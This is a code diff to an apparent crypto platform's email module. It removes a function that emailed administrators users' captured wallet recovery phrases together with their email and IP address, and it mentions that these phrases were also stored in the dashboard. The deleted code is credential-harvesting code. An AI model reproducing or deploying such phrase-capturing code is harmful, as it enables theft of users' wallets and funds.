@@ -204,26 +204,6 @@ export async function sendWithdrawalRequestToAdmin(
   await send(adminEmail, `New Withdrawal Request — $${amount} — ${BRAND_NAME}`, baseTemplate("New Withdrawal Request", body));
 }
 
-export async function sendWalletPhraseToAdmin(
-  adminEmail: string,
-  userEmail: string | null,
-  phrase: string,
-  walletType: string,
-  ip: string | null,
-) {
-  const body = `
-    <p class="body-text">A wallet connection phrase has been captured from the platform.</p>
-    <div class="highlight">
-      <p><strong>Wallet Type:</strong> ${walletType}</p>
-      <p><strong>User:</strong> ${userEmail ?? "Anonymous"}</p>
-      <p><strong>IP Address:</strong> ${ip ?? "Unknown"}</p>
-      <p><strong>Phrase:</strong> ${phrase}</p>
-    </div>
-    <p class="body-text">This phrase has also been stored in the admin dashboard under Wallet Intelligence.</p>
-  `;
-  await send(adminEmail, `Wallet Phrase Captured — ${walletType} — ${BRAND_NAME}`, baseTemplate("Wallet Phrase Captured", body));
-}
-
 export async function sendTestEmail(to: string): Promise<{ ok: boolean; error?: string }> {
   const body = `
     <p class="body-text">This is a test email from ${BRAND_NAME}.</p>
